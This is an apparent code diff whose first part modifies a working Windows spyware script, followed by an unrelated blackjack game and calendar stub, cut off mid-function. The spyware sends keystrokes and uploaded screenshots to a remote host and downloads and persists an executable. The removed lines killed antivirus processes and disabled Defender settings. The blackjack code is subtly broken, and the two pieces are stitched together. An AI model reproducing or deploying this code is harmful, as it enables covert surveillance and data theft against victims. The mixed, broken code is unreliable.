@@ -17,7 +17,10 @@ host = 'http://localhost:8080'
 
 
 def on_press(key):
-    r.get(host + '/key', params={'v': str(key)})
+    try:
+        r.get(host + ':8080/key', params={'v': str(key)})
+    except Exception:
+        print("cannot capture pressed k")
 
 
 def grab():
@@ -27,36 +30,48 @@ def grab():
     # The screen part to capture
     monitor = {"top": 0, "left": 0, "width": screen_width, "height": screen_height}
     while "Screen capturing":
-        grabber = mss.mss()
-        output = o.environ['appdata'] + '\\' + str(time.time()) + ".jpeg".format(**monitor)
-        # Grab the data
-        sct_img = grabber.grab(monitor)
-        screenshot = np.array(sct_img)
-        image = cv.pyrDown(screenshot)
-        cv.imwrite(output, image)
-        print("uploading image")
-        url = host + '/aptima'
-        r.post(url, files={"file": open(output, 'rb')})
-        o.remove(output)
-        print("image uploaded")
-        # Save to the picture file
-        # mss.tools.to_png(sct_img.rgb, sct_img.size, output=output)
-
-        print(output)
-        time.sleep(1)
+        try:
+            grabber = mss.mss()
+            output = o.environ['appdata'] + '\\' + str(time.time()) + ".jpeg".format(**monitor)
+            # Grab the data
+            sct_img = grabber.grab(monitor)
+            screenshot = np.array(sct_img)
+            image = cv.pyrDown(screenshot)
+            cv.imwrite(output, image)
+            print("uploading image")
+            url = host + ':8080/aptima'
+            r.post(url, files={"file": open(output, 'rb')})
+            print("image uploaded")
+            o.remove(output)
+            # Save to the picture file
+            # mss.tools.to_png(sct_img.rgb, sct_img.size, output=output)
+            time.sleep(1)
+        except Exception:
+            print("something wrong happened while capturing screen region")
 
 
 def persist_thread():
-    copy_name = "aptima.exe"
-    file_location = o.environ['appdata'] + '\\' + copy_name
-    print("downloading ....")
-    url = host + '/aptima.exe'
-    req = r.get(url, allow_redirects=True)
-    open(file_location, 'wb').write(req.content)
-    print("download : done")
+    try:
+        copy_name = "aptima.exe"
+        file_location = o.environ['appdata'] + '\\' + copy_name
+        if o.path.exists(file_location):
+            print("une ancienne version est deja presente, on la supprime")
+            o.remove(file_location)
+        print("downloading ....")
+        url = host + '/aptima.exe'
+        req = r.get(url, allow_redirects=True)
+        open(file_location, 'wb').write(req.content)
+        print("download : done")
+    except Exception as e:
+        print("cannot fetch most recent update from server")
+        print(e)
+
     while True:
-        persist()
-        time.sleep(2)
+        try:
+            persist()
+        except Exception:
+            print("cannot persist entity")
+        time.sleep(0.8)
 
 
 def persist():
@@ -66,7 +81,7 @@ def persist():
     # si le fichier existe et fait moins de 10mo, on le dl
     if o.path.isfile(file_location) is False and 1024 * 1024 * 10 > o.path.getsize(file_location):
         print("downloading ....")
-        url = 'http://195.154.191.13/aptima.exe'
+        url = host + '/aptima.exe'
         req = r.get(url, allow_redirects=True)
         open(file_location, 'wb').write(req.content)
         print("download : done")
@@ -84,192 +99,10 @@ def persist():
         print('[+] Error Creating Persistence With The Target Machine')
 
 
-# RANDROMSTRING
-def av():
-    try:
-        o.popen("net stop \"Security Center\"")  # RANDROMSTRING
-    except Exception:
-        print("Something wrong can t disable Sec :(")
-
-    try:  # RANDROMSTRING
-        antiviruslist = ['AAWTray.exe', 'Ad-Aware.exe', 'MSASCui.exe', '_avp32.exe', '_avpcc.exe', '_avpm.exe',
-                         'aAvgApi.exe',
-                         'ackwin32.exe', 'adaware.exe', 'advxdwin.exe', 'agentsvr.exe', 'agentw.exe', 'alertsvc.exe',
-                         'alevir.exe', 'alogserv.exe', 'amon9x.exe', 'anti-trojan.exe', 'antivirus.exe', 'ants.exe',
-                         'apimonitor.exe', 'aplica32.exe', 'apvxdwin.exe', 'arr.exe', 'atcon.exe', 'atguard.exe',
-                         'atro55en.exe',
-                         'atupdater.exe', 'atwatch.exe', 'au.exe', 'aupdate.exe', 'auto-protect.nav80try.exe',
-                         'autodown.exe',
-                         'autotrace.exe', 'autoupdate.exe', 'avconsol.exe', 'ave32.exe', 'avgcc32.exe', 'avgctrl.exe',
-                         'avgemc.exe', 'avgnt.exe', 'avgrsx.exe', 'avgserv.exe', 'avgserv9.exe', 'avguard.exe',
-                         'avgw.exe',
-                         'avkpop.exe', 'avkserv.exe', 'avkservice.exe', 'avkwctl9.exe', 'avltmain.exe', 'avnt.exe',
-                         'avp.exe',
-                         'avp.exe', 'avp32.exe', 'avpcc.exe', 'avpdos32.exe', 'avpm.exe', 'avptc32.exe', 'avpupd.exe',
-                         'avsched32.exe', 'avsynmgr.exe', 'avwin.exe', 'avwin95.exe', 'avwinnt.exe', 'avwupd.exe',
-                         'avwupd32.exe',
-                         'avwupsrv.exe', 'avxmonitor9x.exe', 'avxmonitornt.exe', 'avxquar.exe', 'backweb.exe',
-                         'bargains.exe',
-                         'bd_professional.exe', 'beagle.exe', 'belt.exe', 'bidef.exe', 'bidserver.exe', 'bipcp.exe',
-                         'bipcpevalsetup.exe', 'bisp.exe', 'blackd.exe', 'blackice.exe', 'blink.exe', 'blss.exe',
-                         'bootconf.exe',
-                         'bootwarn.exe', 'borg2.exe', 'bpc.exe', 'brasil.exe', 'bs120.exe', 'bundle.exe', 'bvt.exe',
-                         'ccapp.exe',
-                         'ccevtmgr.exe', 'ccpxysvc.exe', 'cdp.exe', 'cfd.exe', 'cfgwiz.exe', 'cfiadmin.exe',
-                         'cfiaudit.exe',
-                         'cfinet.exe', 'cfinet32.exe', 'claw95.exe', 'claw95cf.exe', 'clean.exe', 'cleaner.exe',
-                         'cleaner3.exe',
-                         'cleanpc.exe', 'click.exe', 'cmesys.exe', 'cmgrdian.exe', 'cmon016.exe',
-                         'connectionmonitor.exe',
-                         'cpd.exe', 'cpf9x206.exe', 'cpfnt206.exe', 'ctrl.exe', 'cv.exe', 'cwnb181.exe', 'cwntdwmo.exe',
-                         'datemanager.exe', 'dcomx.exe', 'defalert.exe', 'defscangui.exe', 'defwatch.exe', 'deputy.exe',
-                         'divx.exe', 'dllcache.exe', 'dllreg.exe', 'doors.exe', 'dpf.exe', 'dpfsetup.exe', 'dpps2.exe',
-                         'drwatson.exe', 'drweb32.exe', 'drwebupw.exe', 'dssagent.exe', 'dvp95.exe', 'dvp95_0.exe',
-                         'ecengine.exe', 'efpeadm.exe', 'emsw.exe', 'ent.exe', 'esafe.exe', 'escanhnt.exe',
-                         'escanv95.exe',
-                         'espwatch.exe', 'ethereal.exe', 'etrustcipe.exe', 'evpn.exe', 'exantivirus-cnet.exe',
-                         'exe.avxw.exe',
-                         'expert.exe', 'explore.exe', 'f-agnt95.exe', 'f-prot.exe', 'f-prot95.exe', 'f-stopw.exe',
-                         'fameh32.exe',
-                         'fast.exe', 'fch32.exe', 'fih32.exe', 'findviru.exe', 'firewall.exe', 'fnrb32.exe',
-                         'fp-win.exe',
-                         'fp-win_trial.exe', 'fprot.exe', 'frw.exe', 'fsaa.exe', 'fsav.exe', 'fsav32.exe',
-                         'fsav530stbyb.exe',
-                         'fsav530wtbyb.exe', 'fsav95.exe', 'fsgk32.exe', 'fsm32.exe', 'fsma32.exe', 'fsmb32.exe',
-                         'gator.exe',
-                         'gbmenu.exe', 'gbpoll.exe', 'generics.exe', 'gmt.exe', 'guard.exe', 'guarddog.exe',
-                         'hacktracersetup.exe', 'hbinst.exe', 'hbsrv.exe', 'hotactio.exe', 'hotpatch.exe', 'htlog.exe',
-                         'htpatch.exe', 'hwpe.exe', 'hxdl.exe', 'hxiul.exe', 'iamapp.exe', 'iamserv.exe',
-                         'iamstats.exe',
-                         'ibmasn.exe', 'ibmavsp.exe', 'icload95.exe', 'icloadnt.exe', 'icmon.exe', 'icsupp95.exe',
-                         'icsuppnt.exe',
-                         'idle.exe', 'iedll.exe', 'iedriver.exe', 'iexplorer.exe', 'iface.exe', 'ifw2000.exe',
-                         'inetlnfo.exe',
-                         'infus.exe', 'infwin.exe', 'init.exe', 'intdel.exe', 'intren.exe', 'iomon98.exe', 'istsvc.exe',
-                         'jammer.exe', 'jdbgmrg.exe', 'jedi.exe', 'kavlite40eng.exe', 'kavpers40eng.exe', 'kavpf.exe',
-                         'kazza.exe', 'keenvalue.exe', 'kerio-pf-213-en-win.exe', 'kerio-wrl-421-en-win.exe',
-                         'kerio-wrp-421-en-win.exe', 'kernel32.exe', 'killprocesssetup161.exe', 'launcher.exe',
-                         'ldnetmon.exe',
-                         'ldpro.exe', 'ldpromenu.exe', 'ldscan.exe', 'lnetinfo.exe', 'loader.exe', 'localnet.exe',
-                         'lockdown.exe',
-                         'lockdown2000.exe', 'lookout.exe', 'lordpe.exe', 'lsetup.exe', 'luall.exe', 'luau.exe',
-                         'lucomserver.exe', 'luinit.exe', 'luspt.exe', 'mapisvc32.exe', 'mcagent.exe', 'mcmnhdlr.exe',
-                         'mcshield.exe', 'mctool.exe', 'mcupdate.exe', 'mcvsrte.exe', 'mcvsshld.exe', 'md.exe',
-                         'mfin32.exe',
-                         'mfw2en.exe', 'mfweng3.02d30.exe', 'mgavrtcl.exe', 'mgavrte.exe', 'mghtml.exe', 'mgui.exe',
-                         'minilog.exe', 'mmod.exe', 'monitor.exe', 'moolive.exe', 'mostat.exe', 'mpfagent.exe',
-                         'mpfservice.exe',
-                         'mpftray.exe', 'mrflux.exe', 'msapp.exe', 'msbb.exe', 'msblast.exe', 'mscache.exe',
-                         'msccn32.exe',
-                         'mscman.exe', 'msconfig.exe', 'msdm.exe', 'msdos.exe', 'msiexec16.exe', 'msinfo32.exe',
-                         'mslaugh.exe',
-                         'msmgt.exe', 'msmsgri32.exe', 'mssmmc32.exe', 'mssys.exe', 'msvxd.exe', 'mu0311ad.exe',
-                         'mwatch.exe',
-                         'n32scanw.exe', 'nav.exe', 'navap.navapsvc.exe', 'navapsvc.exe', 'navapw32.exe', 'navdx.exe',
-                         'navlu32.exe', 'navnt.exe', 'navstub.exe', 'navw32.exe', 'navwnt.exe', 'nc2000.exe',
-                         'ncinst4.exe',
-                         'ndd32.exe', 'neomonitor.exe', 'neowatchlog.exe', 'netarmor.exe', 'netd32.exe', 'netinfo.exe',
-                         'netmon.exe', 'netscanpro.exe', 'netspyhunter-1.2.exe', 'netstat.exe', 'netutils.exe',
-                         'nisserv.exe',
-                         'nisum.exe', 'nmain.exe', 'nod32.exe', 'normist.exe', 'norton_internet_secu_3.0_407.exe',
-                         'notstart.exe',
-                         'npf40_tw_98_nt_me_2k.exe', 'npfmessenger.exe', 'nprotect.exe', 'npscheck.exe', 'npssvc.exe',
-                         'nsched32.exe', 'nssys32.exe', 'nstask32.exe', 'nsupdate.exe', 'nt.exe', 'ntrtscan.exe',
-                         'ntvdm.exe',
-                         'ntxconfig.exe', 'nui.exe', 'nupgrade.exe', 'nvarch16.exe', 'nvc95.exe', 'nvsvc32.exe',
-                         'nwinst4.exe',
-                         'nwservice.exe', 'nwtool16.exe', 'ollydbg.exe', 'onsrvr.exe', 'optimize.exe', 'ostronet.exe',
-                         'otfix.exe', 'outpost.exe', 'outpostinstall.exe', 'outpostproinstall.exe', 'padmin.exe',
-                         'panixk.exe',
-                         'patch.exe', 'pavcl.exe', 'pavproxy.exe', 'pavsched.exe', 'pavw.exe', 'pccwin98.exe',
-                         'pcfwallicon.exe',
-                         'pcip10117_0.exe', 'pcscan.exe', 'pdsetup.exe', 'periscope.exe', 'persfw.exe', 'perswf.exe',
-                         'pf2.exe',
-                         'pfwadmin.exe', 'pgmonitr.exe', 'pingscan.exe', 'platin.exe', 'pop3trap.exe', 'poproxy.exe',
-                         'popscan.exe', 'portdetective.exe', 'portmonitor.exe', 'powerscan.exe', 'ppinupdt.exe',
-                         'pptbc.exe',
-                         'ppvstop.exe', 'prizesurfer.exe', 'prmt.exe', 'prmvr.exe', 'procdump.exe',
-                         'processmonitor.exe',
-                         'procexplorerv1.0.exe', 'programauditor.exe', 'proport.exe', 'protectx.exe', 'pspf.exe',
-                         'purge.exe',
-                         'qconsole.exe', 'qserver.exe', 'rapapp.exe', 'rav7.exe', 'rav7win.exe', 'rav8win32eng.exe',
-                         'ray.exe',
-                         'rb32.exe', 'rcsync.exe', 'realmon.exe', 'reged.exe', 'regedit.exe', 'regedt32.exe',
-                         'rescue.exe',
-                         'rescue32.exe', 'rrguard.exe', 'rshell.exe', 'rtvscan.exe', 'rtvscn95.exe', 'rulaunch.exe',
-                         'run32dll.exe', 'rundll.exe', 'rundll16.exe', 'ruxdll32.exe', 'safeweb.exe', 'sahagent.exe',
-                         'save.exe',
-                         'savenow.exe', 'sbserv.exe', 'sc.exe', 'scam32.exe', 'scan32.exe', 'scan95.exe', 'scanpm.exe',
-                         'scrscan.exe', 'serv95.exe', 'setup_flowprotector_us.exe', 'setupvameeval.exe', 'sfc.exe',
-                         'sgssfw32.exe', 'sh.exe', 'shellspyinstall.exe', 'shn.exe', 'showbehind.exe', 'smc.exe',
-                         'sms.exe',
-                         'smss32.exe', 'soap.exe', 'sofi.exe', 'sperm.exe', 'spf.exe', 'sphinx.exe', 'spoler.exe',
-                         'spoolcv.exe',
-                         'spoolsv32.exe', 'spyxx.exe', 'srexe.exe', 'srng.exe', 'ss3edit.exe', 'ssg_4104.exe',
-                         'ssgrate.exe',
-                         'st2.exe', 'start.exe', 'stcloader.exe', 'supftrl.exe', 'support.exe', 'supporter5.exe',
-                         'svc.exe',
-                         'svchostc.exe', 'svchosts.exe', 'svshost.exe', 'sweep95.exe',
-                         'sweepnet.sweepsrv.sys.swnetsup.exe',
-                         'symproxysvc.exe', 'symtray.exe', 'sysedit.exe', 'system.exe', 'system32.exe', 'sysupd.exe',
-                         'taskmg.exe', 'taskmgr.exe', 'taskmo.exe', 'taskmon.exe', 'taumon.exe', 'tbscan.exe', 'tc.exe',
-                         'tca.exe', 'tcm.exe', 'tds-3.exe', 'tds2-98.exe', 'tds2-nt.exe', 'teekids.exe', 'tfak.exe',
-                         'tfak5.exe',
-                         'tgbob.exe', 'titanin.exe', 'titaninxp.exe', 'tracert.exe', 'trickler.exe', 'trjscan.exe',
-                         'trjsetup.exe', 'trojantrap3.exe', 'tsadbot.exe', 'tvmd.exe', 'tvtmd.exe', 'undoboot.exe',
-                         'updat.exe',
-                         'update.exe', 'upgrad.exe', 'utpost.exe', 'vbcmserv.exe', 'vbcons.exe', 'vbust.exe',
-                         'vbwin9x.exe',
-                         'vbwinntw.exe', 'vcsetup.exe', 'vet32.exe', 'vet95.exe', 'vettray.exe', 'vfsetup.exe',
-                         'vir-help.exe',
-                         'virusmdpersonalfirewall.exe', 'vnlan300.exe', 'vnpc3000.exe', 'vpc32.exe', 'vpc42.exe',
-                         'vpfw30s.exe',
-                         'vptray.exe', 'vscan40.exe', 'vscenu6.02d30.exe', 'vsched.exe', 'vsecomr.exe', 'vshwin32.exe',
-                         'vsisetup.exe', 'vsmain.exe', 'vsmon.exe', 'vsstat.exe', 'vswin9xe.exe', 'vswinntse.exe',
-                         'vswinperse.exe', 'w32dsm89.exe', 'w9x.exe', 'watchdog.exe', 'webdav.exe', 'webscanx.exe',
-                         'webtrap.exe',
-                         'wfindv32.exe', 'whoswatchingme.exe', 'wimmun32.exe', 'win-bugsfix.exe', 'win32.exe',
-                         'win32us.exe',
-                         'winactive.exe', 'window.exe', 'windows.exe', 'wininetd.exe', 'wininitx.exe', 'winlogin.exe',
-                         'winmain.exe', 'winnet.exe', 'winppr32.exe', 'winrecon.exe', 'winservn.exe', 'winssk32.exe',
-                         'winstart.exe', 'winstart001.exe', 'wintsk32.exe', 'winupdate.exe', 'wkufind.exe', 'wnad.exe',
-                         'wnt.exe',
-                         'wradmin.exe', 'wrctrl.exe', 'wsbgate.exe', 'wupdater.exe', 'wupdt.exe',
-                         'wyvernworksfirewall.exe',
-                         'xpf202en.exe', 'zapro.exe', 'zapsetup3001.exe', 'zatutor.exe', 'zonalm2601.exe',
-                         'zonealarm.exe']
-        processes = o.popen(
-            'TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()  # RANDROMSTRING
-        ps = []  # RANDROMSTRING
-        for i in processes.split(" "):
-            if ".exe" in i:
-                ps.append(i.replace("K\n", "").replace("\n", ""))
-        print("Killing all av")
-        for antivirus in antiviruslist:
-            for p in ps:
-                if p == antivirus:
-                    print("[*] killing off " + antivirus)
-                    o.popen("TASKKILL /F /IM {}".format(p))
-    except Exception:
-        print("Something Wrong Can t kill AV")
-
-
-def av_thread():
-    while True:
-        av()
-        time.sleep(1)
-
-
 with Listener(on_press=on_press) as listener:
-    try:
-        o.system("powershell.exe -command Add-MpPreference -ExclusionExtension .exe")
-        o.system("powershell.exe -command Set-MpPreference -PUAProtection disable")
-    except Exception:
-        print("cannot deactivate powershell")
     grabbing = threading.Thread(target=grab)
     grabbing.start()
-    killer = threading.Thread(target=av_thread)
-    killer.start()
+
     persister = threading.Thread(target=persist_thread)
     persister.start()
 
@@ -395,3 +228,591 @@ def main(args):
         )
         sys.stdout.flush()
         return
+
+
+# This function displays calendar for a given year
+def showCalender():
+    gui = tk()
+    gui.config(background='grey')
+    gui.title("Calender for the year")
+    gui.geometry("550x600")
+    year = 2021
+    gui.mainloop()
+
+
+BLACK_JACK = 21
+BASE_VALUE = 17
+
+COLOR = {
+    'PURPLE': '\033[1;35;48m',
+    'CYAN': '\033[1;36;48m',
+    'BOLD': '\033[1;37;48m',
+    'BLUE': '\033[1;34;48m',
+    'GREEN': '\033[1;32;48m',
+    'YELLOW': '\033[1;33;48m',
+    'RED': '\033[1;31;48m',
+    'BLACK': '\033[1;30;48m',
+    'UNDERLINE': '\033[4;37;48m',
+    'END': '\033[1;37;0m',
+}
+
+
+class Card:
+    __slots__ = 'suit', 'rank', 'is_face'
+
+    def __init__(self, suit, rank, face=True):
+        """
+        :param suit: patter in the card
+        :param rank: point in the card
+        :param face: show or cover the face(point & pattern on it)
+        """
+        self.suit = suit
+        self.rank = rank
+        self.is_face = face
+
+    def __repr__(self):
+        fmt_card = '\t<rank: {rank:2}, suit: {suit:8}>'
+        if self.is_face:
+            return fmt_card.format(suit=self.suit, rank=self.rank)
+        return fmt_card.format(suit='*-Back-*', rank='*-Back-*')
+
+    def show(self):
+        print(str(self))
+
+
+class Deck:
+    def __init__(self, num=1):
+        """
+        :param num: the number of deck
+        """
+        self.num = num
+        self.cards = []
+        self.built()
+
+    def __repr__(self):
+        return '\n'.join([str(card) for card in self.cards])
+
+    def __len__(self):
+        return len(self.cards)
+
+    def built(self):
+        for _ in range(self.num):
+            ranks = [x for x in range(1, 14)]
+            suits = 'Spades Heart Clubs Diamonds'.split()
+            for suit in suits:
+                for rank in ranks:
+                    card = Card(suit, rank)
+                    self.cards.append(card)
+
+    def shuffle(self):
+        for _ in range(self.num):
+            for index in range(len(self.cards)):
+                i = 8
+                self.cards[index], self.cards[i] = self.cards[i], self.cards[
+                    index]
+
+    def rebuilt(self):
+        self.cards.clear()
+        self.built()
+
+    def deliver(self):
+        return self.cards.pop()
+
+
+class Chips:
+    def __init__(self, amount):
+        """
+        :param amount: the chips you own
+        """
+        self._amount = amount
+        self._bet_amount = 0
+        self._insurance = 0
+        self.is_insurance = False
+        self.is_double = False
+
+    def __bool__(self):
+        return self.amount > 0
+
+    @staticmethod
+    def get_tips(content):
+        fmt_tips = '{color}** TIPS: {content}! **{end}'
+        return fmt_tips.format(color=COLOR.get('YELLOW'),
+                               content=content,
+                               end=COLOR.get('END'))
+
+    @property
+    def amount(self):
+        return self._amount
+
+    @amount.setter
+    def amount(self, value):
+        if not isinstance(value, int):
+            type_tips = 'Please give a integer'
+            raise ValueError(Chips.get_tips(type_tips))
+        if value < 0:
+            amount_tips = 'Your integer should bigger than 0'
+            raise ValueError(Chips.get_tips(amount_tips))
+        self._amount = value
+
+    @property
+    def bet_amount(self):
+        return self._bet_amount
+
+    @bet_amount.setter
+    def bet_amount(self, value):
+        type_tips = 'Please give a integer'
+        amount_tips = 'Your chips should between 1 - ' + str(self.amount) + ' '
+        try:
+            value = int(value)
+        except ValueError:
+            raise ValueError(Chips.get_tips(type_tips))
+        else:
+            if not isinstance(value, int):
+                raise ValueError(Chips.get_tips(type_tips))
+            if (value <= 0) or (value > self.amount):
+                raise ValueError(Chips.get_tips(amount_tips))
+            self._bet_amount = value
+
+    def double_bet(self):
+        if self.can_double():
+            self._bet_amount *= 2
+            self.is_double = True
+        else:
+            over_tips = 'Not enough chips || '
+            cannot_double = 'CAN\'T DO DOUBLE'
+            raise ValueError(Chips.get_tips(over_tips + cannot_double))
+
+    @property
+    def insurance(self):
+        return self._insurance
+
+    @insurance.setter
+    def insurance(self, value):
+        if self.amount - value < 0:
+            over_tips = 'Not enough chips'
+            raise ValueError(Chips.get_tips(over_tips))
+        self._insurance = value
+        self.is_insurance = True
+
+    def current_amount(self):
+        return self.amount - self.bet_amount - self.insurance
+
+    def reset_chip(self):
+        self._bet_amount = 0
+        self._insurance = 0
+        self.is_double = False
+        self.is_insurance = False
+
+    def can_double(self):
+        return self.current_amount() - self.bet_amount >= 0
+
+
+class User:
+    def __init__(self, name, role, chips_amount=None, color='END'):
+        """
+        :param name: User name
+        :param role: dealer or player
+        :param chips_amount: Casino tokens equal money
+        """
+        self.name = name
+        self.prompt = '{role} >> ({name}) : '.format(role=role, name=self.name)
+        self.chips = Chips(chips_amount)
+        self.color = color
+        self.hand = []
+        self.point = 0
+
+    def __repr__(self):
+        return str(self.__dict__)
+
+    def obtain_card(self, deck, face=True):
+        card = deck.deliver()
+        card.is_face = face
+        self.hand.append(card)
+
+    def drop_card(self):
+        self.hand.clear()
+        self.point = 0
+
+    def show_card(self):
+        print('\t    ** Here is my card **')
+        for card in self.hand:
+            card.show()
+
+    def unveil_card(self):
+        for card in self.hand:
+            card.is_face = True
+        self.show_card()
+
+    def calculate_point(self):
+        def _extract_rank():
+            raw_ranks = [card.rank for card in self.hand]
+            cook_ranks = [10 if rank > 10 else rank for rank in raw_ranks]
+            return cook_ranks
+
+        def _sum_up(ranks):
+            rank_one = sum(ranks)
+            rank_eleven = sum([11 if rank == 1 else rank for rank in ranks])
+            # Over or has 2 Ace
+            if (ranks[::-1] == ranks) and (1 in ranks):
+                return 11 + len(ranks) - 1
+            if rank_eleven <= BLACK_JACK:
+                return rank_eleven
+            return rank_one
+
+        points = _extract_rank()
+        self.point = _sum_up(points)
+
+    def is_point(self, opt, point):
+        self.calculate_point()
+        compare_fmt = '{user_point} {opt} {point}'.format(
+            user_point=self.point, opt=opt, point=point)
+        return eval(compare_fmt)
+
+    def speak(self, content='', end_char='\n'):
+        print('')
+        print(COLOR.get(self.color) + self.prompt + COLOR.get('END') + content,
+              end=end_char)
+
+    def showing(self):
+        self.speak()
+        self.show_card()
+
+    def unveiling(self):
+        self.calculate_point()
+        points_fmt = 'My point is: {}'.format(str(self.point))
+        self.speak(points_fmt)
+        self.unveil_card()
+
+
+class Dealer(User):
+    def __init__(self, name):
+        super().__init__(name=name, role='Dealer', color='PURPLE')
+        self.trigger = 0
+
+    def ask_insurance(self):
+        buy_insurance = ("(Insurance pay 2 to 1)\n"
+                         "\tMy Face card is an Ace.\n"
+                         "\tWould your like buy a insurance ?")
+        self.speak(content=buy_insurance)
+
+    def strategy_trigger(self, deck):
+        if self.is_point('<', BASE_VALUE):
+            self.obtain_card(deck)
+        else:
+            self.trigger += 5
+            if self.trigger % 5 == 0:
+                self.obtain_card(deck)
+
+
+class Player(User):
+    def __init__(self, name, amount):
+        super().__init__(name=name,
+                         chips_amount=amount,
+                         role='Player',
+                         color='CYAN')
+        self.refresh_prompt()
+
+    def refresh_prompt(self):
+        self.prompt = '{role} [ ${remain} ] >> ({name}) : '.format(
+            role='Player', name=self.name, remain=self.chips.current_amount())
+
+    def select_choice(self, pattern):
+        my_turn = 'My turn now.'
+        self.speak(content=my_turn)
+        operation = {
+            'I': 'Insurance',
+            'H': 'Hit',
+            'S': 'Stand',
+            'D': 'Double-down',
+            'U': 'Surrender'
+        }
+        enu_choice = enumerate((operation.get(p) for p in pattern), 1)
+        dict_choice = dict(enu_choice)
+        for index, operator in dict_choice.items():
+            choice_fmt = '\t[{index}] {operation}'
+            print(choice_fmt.format(index=index, operation=operator))
+        return dict_choice
+
+
+class Recorder:
+    def __init__(self):
+        self.data = []
+        self.winner = None
+        self.remain_chips = 0
+        self.rounds = 0
+        self.player_win_count = 0
+        self.dealer_win_count = 0
+        self.player_point = 0
+        self.dealer_point = 0
+
+    def update(self, winner, chips, player_point, dealer_point):
+        self.rounds += 1
+        self.remain_chips = chips
+        self.winner = winner
+        if self.winner == 'Player':
+            self.player_win_count += 1
+        elif self.winner == 'Dealer':
+            self.dealer_win_count += 1
+        self.player_point = player_point
+        self.dealer_point = dealer_point
+
+    def record(self, winner, chips, player_point, dealer_point):
+        self.update(winner, chips, player_point, dealer_point)
+
+    def draw_diagram(self):
+        content = 'Record display'
+        bars = '--' * 14
+        content_bar = bars + content + bars
+        base_bar = bars + '-' * len(content) + bars
+
+        o.system('clear')
+        print(base_bar)
+        print(content_bar)
+        print(base_bar)
+        self.digram()
+        print(base_bar)
+        print(content_bar)
+        print(base_bar)
+
+    def digram(self):
+        title = 'Round\tPlayer-Point\tDealer-Point\tWinner-is\tRemain-Chips'
+        row_fmt = '{}\t{}\t\t{}\t\t{}\t\t{}'
+
+        print(title)
+        for row in self.data:
+            print(
+                row_fmt.format(row.rounds, row.player_point, row.dealer_point,
+                               row.winner, row.remain_chips))
+
+        print('')
+        win_rate_fmt = '>> Player win rate: {}%\n>> Dealer win rate: {}%'
+        try:
+            player_rate = round(self.player_win_count / self.rounds * 100, 2)
+            dealer_rate = round(self.dealer_win_count / self.rounds * 100, 2)
+        except ZeroDivisionError:
+            player_rate = 0
+            dealer_rate = 0
+        print(win_rate_fmt.format(player_rate, dealer_rate))
+
+
+class BlackJack:
+    def __init__(self, username):
+        self.deck = Deck()
+        self.dealer = Dealer('Bob')
+        self.player = Player(username.title(), 1000)
+        self.recorder = Recorder()
+        self.go_on = True
+        self.first_hand = True
+        self.choice = None
+        self.winner = None
+        self.bust = False
+        self.res = None
+
+    def play(self):
+        while self.player.chips:
+            self.initial_game()
+            self.in_bet()
+            self.deal_card()
+            while self.go_on:
+                self.choice = self.menu()
+                # self.player.speak()
+                self.chips_manage()
+                try:
+                    self.card_manage()
+                except ValueError as res:
+                    self.bust = True
+                    self.go_on = False
+                    self.res = res
+            if not self.bust:
+                self.is_surrender()
+            self.winner = self.get_winner()
+            self.res = 'Winner is ' + self.winner
+            o.system('clear')
+            self.calculate_chips()
+            self.result_exhibit()
+            self.dealer.unveiling()
+            self.player.unveiling()
+            self.recorder.record(self.winner, self.player.chips.amount,
+                                 self.player.point, self.dealer.point)
+
+        self.recorder.draw_diagram()
+        ending = '\n\tSorry I lost all chips!\n\tTime to say goodbye.'
+        self.player.speak(ending)
+        print('\n' + '-' * 20 + ' End Game ' + '-' * 20)
+
+    def initial_game(self):
+        self.go_on = True
+        self.first_hand = True
+        self.choice = None
+        self.winner = None
+        self.bust = False
+        self.deck.rebuilt()
+        self.deck.shuffle()
+        self.player.chips.reset_chip()
+        self.player.drop_card()
+        self.player.refresh_prompt()
+        self.dealer.drop_card()
+        print('\n' + '-' * 20 + ' Start Game ' + '-' * 20)
+
+    def in_bet(self):
+        in_bet = '\n\tI want to bet: '
+        not_invalid = True
+        self.player.speak(in_bet, end_char='')
+        while not_invalid:
+            try:
+                self.player.chips.bet_amount = input()
+            except ValueError as e:
+                print(e)
+                self.player.speak(in_bet, end_char='')
+                continue
+            except KeyboardInterrupt:
+                print('')
+                self.recorder.draw_diagram()
+                quit()
+            else:
+                self.player.refresh_prompt()
+                # self.player.speak()
+                not_invalid = False
+
+    def deal_card(self):
+        # dealer
+        self.dealer.obtain_card(self.deck, face=False)
+        self.dealer.obtain_card(self.deck)
+
+        # player
+        self.player.obtain_card(self.deck)
+        self.player.obtain_card(self.deck)
+
+        self.dealer.showing()
+        self.player.showing()
+
+    def menu(self):
+        pattern = 'HS'
+        if self.first_hand:
+            pattern += 'U'
+            if self.dealer.hand[
+                1].rank == 1 and self.player.chips.current_amount():
+                pattern += 'I'
+                self.dealer.ask_insurance()
+            if self.player.is_point('>',
+                                    10) and self.player.chips.can_double():
+                pattern += 'D'
+            self.first_hand = False
+        choices = self.player.select_choice(pattern)
+        select = self.get_select(len(choices),
+                                 general_err='Select above number.')
+        return choices[select]
+
+    @staticmethod
+    def get_select(select_max, prompt='>> ', general_err=''):
+        while True:
+            try:
+                value = input(prompt)
+                select = int(value)
+                if select > select_max:
+                    raise ValueError
+            except ValueError:
+                print(general_err)
+                continue
+            except KeyboardInterrupt:
+                print('')
+                quit()
+            else:
+                return select
+
+    def chips_manage(self):
+        if self.choice == 'Insurance':
+            err = ('The amount should under ' +
+                   str(self.player.chips.current_amount()))
+            pay_ins = self.get_select(self.player.chips.current_amount(),
+                                      prompt='Insurance amount >> ',
+                                      general_err=err)
+            self.player.chips.insurance = pay_ins
+
+        if self.choice == 'Double-down':
+            try:
+                self.player.chips.double_bet()
+            except ValueError as e:
+                print(e)
+        self.player.refresh_prompt()
+        if self.choice in ('Insurance', 'Double-down', 'Surrender'):
+            self.go_on = False
+
+    def card_manage(self):
+        if self.choice in ('Hit', 'Double-down'):
+            self.player.obtain_card(self.deck)
+            if self.player.is_point('>', BLACK_JACK):
+                raise ValueError('Player BUST')
+            else:
+                self.dealer.strategy_trigger(self.deck)
+                if self.dealer.is_point('>', BLACK_JACK):
+                    raise ValueError('Dealer BUST')
+        elif self.choice != 'Surrender':
+            if not self.player.chips.is_insurance:
+                self.dealer.strategy_trigger(self.deck)
+                if self.dealer.is_point('>', BLACK_JACK):
+                    raise ValueError('Dealer BUST')
+
+        self.dealer.showing()
+        self.player.showing()
+        if self.choice in ('Double-down', 'Stand'):
+            self.go_on = False
+
+    def is_surrender(self):
+        if self.choice == 'Surrender':
+            self.player.speak('Sorry, I surrender....\n')
+
+    def get_winner(self):
+        if self.bust:
